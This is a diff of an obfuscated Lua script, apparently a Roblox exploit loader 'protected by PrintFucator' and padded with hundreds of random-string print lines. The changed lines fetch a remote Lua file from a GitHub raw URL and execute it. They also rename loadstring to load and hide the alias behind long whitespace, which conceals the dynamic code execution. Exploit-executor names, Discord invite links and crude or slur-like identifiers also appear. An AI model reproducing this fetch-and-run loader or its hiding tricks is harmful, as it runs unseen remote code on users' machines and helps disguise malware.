@@ -1740,7 +1740,7 @@ print("osjmpnpfibarlxixsqyyjxyjodyxvpaptmzrzqzwkguianpfsjwzutmxviajubdyjkflzdnal
 print("pncuyyvfefgoemfqzuawgijwgdrsyalgwgmutgmtjjxitumbjyhfhxcmkfmpidsznqdasawbqstnjwcfjezdixhzwxabpathzqfxpvufnymzzkmzuomsytdbzuqidwaldorzstcrokgcuufuoaqwvb")
 print("dbfsvyfoosqejkohtzjcvrafdnwaxqlmqmzftmiwzlptazsiffslwtwoehrkqonwoetxfbrxgumkxbcblhkacwajkojdfqrqxdszqdfnwacdmumkyvicsvzcoodrfsvwvwdbckgyoistqdkqjskenk")
 print("kdjununshvlcpsclwxlotxuxdmcnbxukgjgvojfrclvytjjqdjihmfwaxnhcdhzkuochubokuomegztxpjglfbjktiqxvpiewgymcvhosexccihaosqpqlebhbcibgzglohdpmfxurbdbslroufjmi")
-local gamehttp = game.PlaceId print("kdjununshvlcpsclwxlotxuxdmcnbxukgjgvojfrclvytjjqdjihmfwaxnhcdhzkuochubokuomegztxpjglfbjktiqxvpiewgymcvhosexccihaosqpqleb")
+print("hwspbfvmuyoocpbwpzpmowyjrfrrtrucaduibyxzcvxtvxexkcpwolujqtwdaegdqlemqcssfavijdwtmpdqdjsizqyibavhpuxnvsvfnbcmpzuwmorjgrktisomhrfcagcpwudkleqfjzxbqchskp")
 print("vredcjhfcznfvgvlykndmmvfxolpunourhdnihzczuhomephzdurcwrgolmzujpmvfwxxeewsrlbbbxujpgihoolpokgxlljqycxvijmmlgjrlvyxevyreayllnicmwrgdgwfmkdajfyzmwsnvdkpt")
 print("uorffjzaacapidgqwrtgnezjotgunvpzpkhoyjyxdlwjtujoalmfwkmywoakncslbouqmejvnqwfuaokuoqayfohiahurmqhqrtovlzioscvfdhsoloomwnumygtdjcfvnrkphxkelwqlmqbltbnnt")
 print("svathryqpouddqqdndqyfvuaxnqtsfsljiqupscehgolodqnnhxeidemzupstehjqnadpicctgselaoyewgkioeowyawnzqymjocggtgytjfciitskdvwzspsksriyuxughzrcirncuzyxqjvcznfr")
@@ -1750,7 +1750,7 @@ print("gqgtnuywohgagjbamthcrawgxgdrkrgnwtzrufncswmbjpgrpfgrnkpnhunseyoxcsklqxfcp
 print("ajpmbayfczwxwjurjzvsagwiyfamzyognfogphqwumcawcdgxfywzqjuzulytyyetvwnsvdtugfbggihippkhcokclklmybscqjplfbdbvaglqsruuzvvvkutpexsllcczewsgyyyugypfibtfvlir")
 print("uwocdzoogcyjpubouoagvnwkrratxvgkntnsliunrduvezovwtgzcbopwauqafmazstkaueoopjknstspayrzlbmkvtozslmkaxvqokyserztxtwrhjdpfpnhjzyouhwesrhtfpaoiivmtngrncatc")
 print("lhmzplmkiobmmrcxphnzqzalskjrhuwkuvchajcwfrowomuknkjosxymirrmwrjptcjccekefwpeelysyrvczllaepjsafzcjfgfuwcdtpyzfazitgmlwzlyvflaigaakytvxhulfbynppuwkompwj")
-local cvhPUVpVX0hw6ydOKH7VQlDSdCTwD1IlZURNNZhQ0ssSeOgun6MrH1fvxAu1e08ngv5hUMYwGyGTuc4OBjFgilMCXjvKHTI3SFE = loadstring(game:HttpGet("https://raw.githubusercontent.com/sxMob/pon/main/yeyeh.lua"))()
+local cvhPUVpVX0hw6ydOKH7VQlDSdCTwD1IlZURNNZhQ0ssSeOgun6MrH1fvxAu1e08ngv5hUMYwGyGTuc4OBjFgilMCXjvKHTI3SFE = load(game:HttpGet("https://raw.githubusercontent.com/sxMob/pon/main/yeyeh.lua"))()
 print("ygbwsqmclbauzjilswarqglzzdtihpltlumsoixvjlxlckolwyzboyyxzpszbbkcwzpeiufmsozivpxsubyatlservdlsepgddkeeylmgtmdunzofrbqpgrqicqlygyrrisazercigcfaxkpnafvrf")
 print("mtzngbujfqthqxescltqjjsiyqkukwjuckkekvgotclwaukjobvgigbgyalhgepquftsddnrksehozpfmuiatxcdbexiqmmyitfggnhforjnbgtxgavxstqjvdekmhmhhmeplzpkxittbvqyxmdfvl")
 print("ainnzrcopgjnkxkfilyovdjusjqpqhybdhvndybhjnpmsmqjuqhljjeozgrghftjjfdzzprfapnffcosdnpentxvhhnxtjiehcxhprhncicklmfmwcpadqhqgmdvbekznzfeemsizngysuzuaewuik")
@@ -2268,7 +2268,7 @@ local PRINTFUSCATOR = {
 -- } 
 ([[This lua protected by PrintFucator]]):gsub('.+', (function(a) _oSSD_iVpaxrx = a; end))
 :gsub('.+', (function(a) _D4H_i1Zaxhc = a; end))
-do local a='Mob#1337 - https://discord.gg/PNEZ2t9MZP' local m=14 local a=sxMob local b=Sobaken local i=Liddex local z=talant local gayfurrybdsmpornlover=hinex local ZoV=Keon4ek local vbb=vbbshkin local xyesos=Smertnix 
+do local a='Mob#1337 - https://discord.gg/PNEZ2t9MZP' local m=14 local a=sxMob local b=Sobaken local i=Liddex local z=talant local gayfurrybdsmpornlover=hinex local ZoV=Keon4ek local vbb=vbbshkin local xyesos=Smertnix                                         local load=loadstring
     local yeyehubishe='https://discord.gg/PNEZ2t9MZ' local synapse=x local krnl=bestexecutorreallylol local f=754 local fluxus=shluxus local OG=1271158577 local trx=kakish local nasral=obfusctor local fe=headless
     local ja='https://discord.gg/PNEZ2t9MZ' local ea='https://discord.gg/PNEZ2t9MZ' local ra='https://discord.gg/PNEZ2t9MZ'local z=34;local ba=7;local bb=894;local bc=3;local bd=36;local be=9;local bf=21;local bg=4;local bh=u;local bi=172
     local na='https://discord.gg/PNEZ2t9MZ' local damn='https://discord.gg/PNEZ2t9MZ' local discord='https://discord.gg/PNEZ2t9MZ' local Mob='https://discord.gg/PNEZ2t9MZ' local poor='https://discord.gg/PNEZ2t9MZ' local k=64 
